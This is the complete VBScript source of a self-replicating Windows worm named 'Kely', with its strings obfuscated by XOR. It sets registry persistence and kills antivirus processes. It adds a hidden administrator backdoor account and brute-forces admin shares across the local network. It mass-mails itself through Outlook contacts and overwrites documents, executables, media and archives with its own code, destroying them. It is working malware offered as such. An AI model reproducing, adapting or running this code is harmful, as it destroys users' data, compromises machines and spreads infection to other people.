'This worm is 4 my love girl
'and this worm name is <Kely ver1.0>
'Author:Vxbug /SVS
'0nly a simple worm
'The codz write bad@maybe i will rewrite next time...

On Error Resume Next
Dim virCopy
Set myfso=CreateObject(kely("qapkrvkle,dkngq{qvgom`hgav")) 
Set objshell=wscript.createobject(kely("uqapkrv,qjgnn"))
Set vir=myfso.opentextfile(wscript.scriptfullname,1)
virCopy=vir.readall
vir.close
Set dirwin=myfso.getspecialfolder(0)
Set dirSys=myfso.getspecialfolder(1)
Set dirTemp=myfso.getspecialfolder(2)

myfso.getfile(wscript.scriptfullname).copy(dirwin & kely("^q{qvgo10,fnn,t`q"))
myfso.getfile(wscript.scriptfullname).copy(dirSys & kely("^Oqvcqi,gzg,t`q"))
myfso.getfile(wscript.scriptfullname).copy(dirTemp & kely("^ammikgq,vzv,t`q"))

Set myreg=CreateObject(kely("uqapkrv,qjgnn"))
myreg.regwrite kely("JIG[]NMACN]OCAJKLG^Qmdvucpg^Okapmqmdv^Uklfmuq^AwppglvTgpqkml^Pwl^q{qvgo10,fnn"),dirwin & kely("^q{qvgo10,fnn,t`q")
myreg.regwrite kely("JIG[]NMACN]OCAJKLG^Qmdvucpg^Okapmqmdv^Uklfmuq^AwppglvTgpqkml^Pwl^Oqvcqi,gzg"),dirSys & kely("^Oqvcqi,gzg,t`q")
myreg.regwrite kely("JIG[]NMACN]OCAJKLG^Qmdvucpg^Okapmqmdv^Uklfmuq^AwppglvTgpqkml^Pwl^iwnk{wcl"),dirTemp & kely("^ammikgq,vzv,t`q")
killAvsoft()
lanHack()
backdoor()
sendmail()
listdrv()
Ddos()
createshort()

'***********************************************
Sub killAvsoft()
strComputer = "."
Set objWMIService = GetObject(kely("ukloeovq8") & kely("ykorgpqmlcvkmlNgtgn?korgpqmlcvg#^^") & strComputer & kely("^pmmv^akot0"))
Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'KAVPlus.exe' or Name='PFwmain.exe' or Name='RavMon.exe' or Name='VPC32.exe' or Name='KAV9X.exe' or Name='KAVPFW.exe' or Name='Rfw.exe' or Name='PFW.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Next
End Sub
'***********************************************
Sub backDoor()
On Error Resume Next
Dim str
str=Mid(myfso.getspecialfolder(0),4)
If (Str=kely("a8^UKLLV")) Then
objshell.run kely("lgv"wqgp"ign{"-cff"),0,true
objshell.run kely("lgv"wqgp"ign{"3;:73035"),0,true
objshell.run kely("lgv"nmacnepmwr"cfoklkqvpcvmpq"ign{-cff"),0,true
End If 
End Sub
'***********************************************
Sub lanHack()
On Error Resume Next
Dim objshell
Dim passDic
passDic="admin,administrator,root,123456,!@#$%^,webmaster,hacker,www,abcdefg,test,test123,windows,654321,admin"
sigPass=Split(passDic,Chr(44),-1,1)
Set objshell=wscript.createobject(kely("uqapkrv,qjgnn"))
Dim str
str=Mid(myfso.getspecialfolder(0),4)
If (str="WINNT") Then
objshell.run "net send 192.168.0.254 In the LAN,have some worm named *Kely worm*!",0,true
For i=1 to 254
For j=0 to UBound(sigPass)
Dim St,pass,sc
st="net use \\" & "192.168.0." & i & "\IPC$ "& sigpass(j) &" /" & "administrator"
objshell.run st
sc="copy c:\kely.vbs \\192.168.0." & i &"\admin$"
objshell.run sc
Next
Next
End If
End Sub 
'***********************************************

Sub sendMail()
Set ol=CreateObject("Outlook.Application") 
Set myfso=CreateObject(kely("qapkrvkle,dkngq{qvgom`hgav"))
Set dirwin=myfso.getspecialfolder(0)
On Error Resume Next 
Randomize
Dim num,m_title
num =Int((5 * Rnd) + 1)
If(num=1) Then
m_title="Kely's mail!"
ElseIf(num=2) Then
m_title="Kely wana know u!"
ElseIf(num=3) Then
m_title="Kely is my girlfriend!"
ElseIf(num=4) Then
m_title="I love Kely!"
ElseIf(num=5) Then
m_title="Kely,I miss u!"
End If
For x=1 To 50 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject=m_title
Mail.Body="Do u know,I love Kely very much!" 
Mail.Attachments.Add(dirwin & "\system32.dll.vbs") 
Mail.Send 
Next 
ol.Quit
End Sub

Sub listdrv()
dim fso
set fso=createobject(kely("qapkrvkle,dkngq{qvgom`hgav"))
On Error Resume Next
Dim drv,drvgroup,s
Set drvgroup = fso.Drives
For Each drv in drvgroup
If drv.DriveType=1 or drv.DriveType=2 or drv.DriveType=3 Then
folderlist(drv.path & "\")
set fso=createobject(kely("qapkrvkle,dkngq{qvgom`hgav"))
fso.getfile(wscript.scriptfullname).copy (drv.path & kely("^Ign{,t`q"))
end if
Next
listadriv = s
End Sub
'***********************************************
Sub Ddos()
Set myreg=CreateObject(kely("uqapkrv,qjgnn"))
Dim downloaddir
On Error Resume Next
downloaddir=myreg.regread(kely("JIG[]AWPPGLV]WQGP^Qmdvucpg^Okapmqmdv^Klvgplgv"Gzrnmpgp^Fmulnmcf"Fkpgavmp{"))
downloaddir="c:\"
If(fileexist(kely("a8^ign{,FNN,gzg"))=1) Then
myreg.run "kely.DLL.exe"
Else
myreg.regwrite kely("JIAW^Qmdvucpg^Okapmqmdv^Klvgplgv"Gzrnmpgp^Ockl^Qvcpv"Rceg"),kely("(,(,(,(-ign{,FNN,gzg")
End If
End Sub
'***********************************************
Sub folderlist(folderspec)
On Error Resume Next
set fso=createobject(kely("qapkrvkle,dkngq{qvgom`hgav"))
Dim fo,f1,sf
Set fo = fso.GetFolder(folderspec)
Set sf = fo.SubFolders
For each f1 in sf
fso.getfile(wscript.scriptfullname).copy (f1.path & kely("^Ign{,t`q"))
infect(f1.path,vircopy)
folderlist(f1.path)
Next
End Sub
'***********************************************
sub infect(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap',s
Set fso=CreateObject(kely("qapkrvkle,dkngq{qvgom`hgav"))
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For each f1 in fc
ext = fso.GetExtensionName(f1.path)
ext = lcase(ext)
If (ext = "vbs") or (ext = "vbe") then
set ap1 = fso.OpenTextFile(f1.path,2,true)
ap1.write vircopy
ap1.close
elseif (ext = "wsh") or (ext = "mp3") then
set ap2 = fso.OpenTextFile(f1.path,2,true)
ap2.write vircopy
ap2.close
elseif (ext = "dll") or (ext = "exe") or (ext = "bak") or (ext = "sys") then
set ap3 = fso.OpenTextFile(f1.path,2,true)
ap3.write vircopy
ap3.close
elseif (ext = "doc") or (ext = "htm") or (ext = "xls") or (ext = "ppt")  then
set ap4 = fso.OpenTextFile(f1.path,2,true)
ap4.write vircopy
ap4.close
elseif (ext = "zip") or (ext = "rar") or (ext = "cab") or (ext = "jpeg")  then
set ap5 = fso.OpenTextFile(f1.path,2,true)
ap5.write vircopy
ap5.close
end if
Next
End Sub

Function kely(mystr)
Dim i
Dim si
Dim n
Dim s
For i = 1 To Len(mystr)
si = Mid(mystr, i, 1)
If (si = Chr(34)) Then
n = Asc(si)
Else
n = Asc(si)
n = n Xor 2
s = Chr(n)
kely = kely + s
End If
Next
End Function

Sub createshort()
REM
set WshShell = WScript.CreateObject(kely("UQapkrv,Qjgnn"))
strDesktop = WshShell.SpecialFolders(kely("Fgqivmr"))
set oShellLink = WshShell.CreateShortcut(strDesktop & kely("^Ign{,vzv,nli"))
oShellLink.TargetPath = WScript.ScriptFullName
oShellLink.WindowStyle = 1
oShellLink.Hotkey = "Ctrl+Alt+e"
oShellLink.IconLocation = "notepad.exe, 0"
oShellLink.Description = "Shortcut Script"
oShellLink.WorkingDirectory = strDesktop
oShellLink.Save
set oUrlLink = WshShell.CreateShortcut(strDesktop & "\Whitehouse.url")
oUrlLink.TargetPath = "http://www.whitehouse.gov"
oUrlLink.Save
End Sub














